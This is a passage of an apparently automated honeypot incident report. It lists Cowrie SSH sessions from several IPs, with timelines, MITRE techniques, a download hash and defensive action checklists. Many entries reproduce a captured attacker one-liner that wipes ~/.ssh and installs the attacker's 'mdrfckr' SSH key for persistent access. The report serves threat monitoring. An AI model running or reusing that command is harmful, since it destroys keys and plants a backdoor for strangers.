- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-708a30385cea

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-20 19:57 |
| **Last Seen** | 2026-04-20 19:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 19:57:59` | `cowrie.session.connect` |
| `2026-04-20 19:57:59` | `cowrie.client.version` |
| `2026-04-20 19:58:00` | `cowrie.client.kex` |
| `2026-04-20 19:58:00` | `cowrie.login.success` |
| `2026-04-20 19:58:00` | `cowrie.session.params` |
| `2026-04-20 19:58:00` | `cowrie.command.input` |
| `2026-04-20 19:58:00` | `cowrie.command.failed` |
| `2026-04-20 19:58:01` | `cowrie.log.closed` |
| `2026-04-20 19:58:01` | `cowrie.session.params` |
| `2026-04-20 19:58:01` | `cowrie.command.input` |
| `2026-04-20 19:58:01` | `cowrie.session.file_download` |
| `2026-04-20 19:58:01` | `cowrie.log.closed` |
| `2026-04-20 19:58:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98ba61c22d19

| Field | Detail |
|---|---|
| **Source IP** | `186.219.184[.]142` |
| **First Seen** | 2026-04-20 19:58 |
| **Last Seen** | 2026-04-20 19:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 19:58:01` | `cowrie.session.connect` |
| `2026-04-20 19:58:01` | `cowrie.client.version` |
| `2026-04-20 19:58:01` | `cowrie.client.kex` |
| `2026-04-20 19:58:03` | `cowrie.login.success` |
| `2026-04-20 19:58:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.219.184[.]142` to AbuseIPDB if not already reported
- [ ] Block `186.219.184[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db6c2f598e9d

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-20 19:58 |
| **Last Seen** | 2026-04-20 19:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 19:58:03` | `cowrie.session.connect` |
| `2026-04-20 19:58:03` | `cowrie.client.version` |
| `2026-04-20 19:58:03` | `cowrie.client.kex` |
| `2026-04-20 19:58:04` | `cowrie.login.success` |
| `2026-04-20 19:58:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72d6b8833cce

| Field | Detail |
|---|---|
| **Source IP** | `46.253.45[.]10` |
| **First Seen** | 2026-04-20 19:58 |
| **Last Seen** | 2026-04-20 19:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 19:58:11` | `cowrie.session.connect` |
| `2026-04-20 19:58:11` | `cowrie.client.version` |
| `2026-04-20 19:58:11` | `cowrie.client.kex` |
| `2026-04-20 19:58:12` | `cowrie.login.success` |
| `2026-04-20 19:58:12` | `cowrie.session.params` |
| `2026-04-20 19:58:12` | `cowrie.command.input` |
| `2026-04-20 19:58:12` | `cowrie.command.failed` |
| `2026-04-20 19:58:12` | `cowrie.log.closed` |
| `2026-04-20 19:58:13` | `cowrie.session.params` |
| `2026-04-20 19:58:13` | `cowrie.command.input` |
| `2026-04-20 19:58:13` | `cowrie.session.file_download` |
| `2026-04-20 19:58:13` | `cowrie.log.closed` |
| `2026-04-20 19:58:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.253.45[.]10` to AbuseIPDB if not already reported
- [ ] Block `46.253.45[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8bc2e0d137d2

| Field | Detail |
|---|---|
| **Source IP** | `46.253.45[.]10` |
| **First Seen** | 2026-04-20 19:58 |
| **Last Seen** | 2026-04-20 19:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 19:58:15` | `cowrie.session.connect` |
| `2026-04-20 19:58:15` | `cowrie.client.version` |
| `2026-04-20 19:58:15` | `cowrie.client.kex` |
| `2026-04-20 19:58:15` | `cowrie.login.success` |
| `2026-04-20 19:58:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.253.45[.]10` to AbuseIPDB if not already reported
- [ ] Block `46.253.45[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ef6f27a7ec3

| Field | Detail |
|---|---|
| **Source IP** | `154.221.28[.]214` |
| **First Seen** | 2026-04-20 19:58 |
| **Last Seen** | 2026-04-20 19:58 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 19:58:25` | `cowrie.session.connect` |
| `2026-04-20 19:58:25` | `cowrie.client.version` |
| `2026-04-20 19:58:25` | `cowrie.client.kex` |
| `2026-04-20 19:58:26` | `cowrie.login.success` |
| `2026-04-20 19:58:26` | `cowrie.session.params` |
| `2026-04-20 19:58:26` | `cowrie.command.input` |
| `2026-04-20 19:58:26` | `cowrie.command.failed` |
| `2026-04-20 19:58:26` | `cowrie.log.closed` |
| `2026-04-20 19:58:26` | `cowrie.session.params` |
| `2026-04-20 19:58:26` | `cowrie.command.input` |
| `2026-04-20 19:58:26` | `cowrie.session.file_download` |
| `2026-04-20 19:58:26` | `cowrie.log.closed` |
| `2026-04-20 19:58:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.28[.]214` to AbuseIPDB if not already reported
- [ ] Block `154.221.28[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-200637f829b2

| Field | Detail |
|---|---|
| **Source IP** | `154.221.28[.]214` |
| **First Seen** | 2026-04-20 19:58 |
| **Last Seen** | 2026-04-20 19:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 19:58:28` | `cowrie.session.connect` |
| `2026-04-20 19:58:28` | `cowrie.client.version` |
| `2026-04-20 19:58:28` | `cowrie.client.kex` |
| `2026-04-20 19:58:29` | `cowrie.login.success` |
| `2026-04-20 19:58:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.28[.]214` to AbuseIPDB if not already reported
- [ ] Block `154.221.28[.]214` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7b83706d8f9

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-20 19:58 |
| **Last Seen** | 2026-04-20 19:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 19:58:41` | `cowrie.session.connect` |
| `2026-04-20 19:58:41` | `cowrie.client.version` |
| `2026-04-20 19:58:41` | `cowrie.client.kex` |
| `2026-04-20 19:58:42` | `cowrie.login.success` |
| `2026-04-20 19:58:42` | `cowrie.session.params` |
| `2026-04-20 19:58:42` | `cowrie.command.input` |
| `2026-04-20 19:58:42` | `cowrie.command.failed` |
| `2026-04-20 19:58:42` | `cowrie.log.closed` |
| `2026-04-20 19:58:42` | `cowrie.session.params` |
| `2026-04-20 19:58:42` | `cowrie.command.input` |
| `2026-04-20 19:58:43` | `cowrie.session.file_download` |
| `2026-04-20 19:58:43` | `cowrie.log.closed` |
| `2026-04-20 19:58:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8610cbd2fdc1

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-20 19:58 |
| **Last Seen** | 2026-04-20 19:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 19:58:45` | `cowrie.session.connect` |
| `2026-04-20 19:58:45` | `cowrie.client.version` |
| `2026-04-20 19:58:45` | `cowrie.client.kex` |
| `2026-04-20 19:58:45` | `cowrie.login.success` |
| `2026-04-20 19:58:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb3ffc12e7d8

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-20 19:59 |
| **Last Seen** | 2026-04-20 19:59 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 19:59:25` | `cowrie.session.connect` |
| `2026-04-20 19:59:25` | `cowrie.client.version` |
| `2026-04-20 19:59:25` | `cowrie.client.kex` |
| `2026-04-20 19:59:26` | `cowrie.login.success` |
| `2026-04-20 19:59:26` | `cowrie.session.params` |
| `2026-04-20 19:59:26` | `cowrie.command.input` |
| `2026-04-20 19:59:26` | `cowrie.command.failed` |
| `2026-04-20 19:59:26` | `cowrie.log.closed` |
| `2026-04-20 19:59:27` | `cowrie.session.params` |
| `2026-04-20 19:59:27` | `cowrie.command.input` |
| `2026-04-20 19:59:27` | `cowrie.session.file_download` |
| `2026-04-20 19:59:27` | `cowrie.log.closed` |
| `2026-04-20 19:59:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1efec70db2c3

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-20 19:59 |
| **Last Seen** | 2026-04-20 19:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 19:59:29` | `cowrie.session.connect` |
| `2026-04-20 19:59:29` | `cowrie.client.version` |
| `2026-04-20 19:59:29` | `cowrie.client.kex` |
| `2026-04-20 19:59:29` | `cowrie.login.success` |
| `2026-04-20 19:59:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5b65bf7977b

| Field | Detail |
|---|---|
| **Source IP** | `46.253.45[.]10` |
| **First Seen** | 2026-04-20 19:59 |
| **Last Seen** | 2026-04-20 19:59 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 19:59:35` | `cowrie.session.connect` |
| `2026-04-20 19:59:35` | `cowrie.client.version` |
| `2026-04-20 19:59:35` | `cowrie.client.kex` |
| `2026-04-20 19:59:36` | `cowrie.login.success` |
| `2026-04-20 19:59:36` | `cowrie.session.params` |
| `2026-04-20 19:59:36` | `cowrie.command.input` |
| `2026-04-20 19:59:36` | `cowrie.command.failed` |
| `2026-04-20 19:59:36` | `cowrie.log.closed` |
| `2026-04-20 19:59:37` | `cowrie.session.params` |
| `2026-04-20 19:59:37` | `cowrie.command.input` |
| `2026-04-20 19:59:37` | `cowrie.session.file_download` |
| `2026-04-20 19:59:37` | `cowrie.log.closed` |
| `2026-04-20 19:59:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.253.45[.]10` to AbuseIPDB if not already reported
- [ ] Block `46.253.45[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67b73cb46433

| Field | Detail |
|---|---|
| **Source IP** | `46.253.45[.]10` |
| **First Seen** | 2026-04-20 19:59 |
| **Last Seen** | 2026-04-20 19:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 19:59:39` | `cowrie.session.connect` |
| `2026-04-20 19:59:39` | `cowrie.client.version` |
| `2026-04-20 19:59:39` | `cowrie.client.kex` |
| `2026-04-20 19:59:40` | `cowrie.login.success` |
| `2026-04-20 19:59:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.253.45[.]10` to AbuseIPDB if not already reported
- [ ] Block `46.253.45[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a468f4ab926

| Field | Detail |
|---|---|
| **Source IP** | `209.141.47[.]217` |
| **First Seen** | 2026-04-20 19:59 |
| **Last Seen** | 2026-04-20 20:00 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 19:59:59` | `cowrie.session.connect` |
| `2026-04-20 19:59:59` | `cowrie.client.version` |
| `2026-04-20 20:00:00` | `cowrie.client.kex` |
| `2026-04-20 20:00:01` | `cowrie.login.success` |
| `2026-04-20 20:00:01` | `cowrie.session.params` |
| `2026-04-20 20:00:01` | `cowrie.command.input` |
| `2026-04-20 20:00:01` | `cowrie.command.failed` |
| `2026-04-20 20:00:01` | `cowrie.log.closed` |
| `2026-04-20 20:00:02` | `cowrie.session.params` |
| `2026-04-20 20:00:02` | `cowrie.command.input` |
| `2026-04-20 20:00:02` | `cowrie.session.file_download` |
| `2026-04-20 20:00:02` | `cowrie.log.closed` |
| `2026-04-20 20:00:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.47[.]217` to AbuseIPDB if not already reported
- [ ] Block `209.141.47[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22594e5edfb8

| Field | Detail |
|---|---|
| **Source IP** | `209.141.47[.]217` |
| **First Seen** | 2026-04-20 20:00 |
| **Last Seen** | 2026-04-20 20:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:00:05` | `cowrie.session.connect` |
| `2026-04-20 20:00:05` | `cowrie.client.version` |
| `2026-04-20 20:00:06` | `cowrie.client.kex` |
| `2026-04-20 20:00:07` | `cowrie.login.success` |
| `2026-04-20 20:00:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.47[.]217` to AbuseIPDB if not already reported
- [ ] Block `209.141.47[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88db4320d2bb

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-20 20:00 |
| **Last Seen** | 2026-04-20 20:00 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:00:07` | `cowrie.session.connect` |
| `2026-04-20 20:00:07` | `cowrie.client.version` |
| `2026-04-20 20:00:08` | `cowrie.client.kex` |
| `2026-04-20 20:00:08` | `cowrie.login.success` |
| `2026-04-20 20:00:08` | `cowrie.session.params` |
| `2026-04-20 20:00:08` | `cowrie.command.input` |
| `2026-04-20 20:00:08` | `cowrie.command.failed` |
| `2026-04-20 20:00:09` | `cowrie.log.closed` |
| `2026-04-20 20:00:09` | `cowrie.session.params` |
| `2026-04-20 20:00:09` | `cowrie.command.input` |
| `2026-04-20 20:00:09` | `cowrie.session.file_download` |
| `2026-04-20 20:00:09` | `cowrie.log.closed` |
| `2026-04-20 20:00:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2364ae9079f2

| Field | Detail |
|---|---|
| **Source IP** | `154.221.28[.]214` |
| **First Seen** | 2026-04-20 20:00 |
| **Last Seen** | 2026-04-20 20:00 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

